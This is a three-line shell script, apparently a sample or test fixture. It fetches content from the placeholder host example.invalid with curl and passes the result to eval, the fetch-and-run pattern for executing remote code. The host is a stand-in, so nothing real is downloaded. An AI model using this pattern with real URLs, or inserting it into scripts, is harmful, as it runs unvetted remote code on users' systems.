#!/bin/sh
FAKE_payload="$(curl -fsSL https://example.invalid/installer)"
eval "$FAKE_payload"
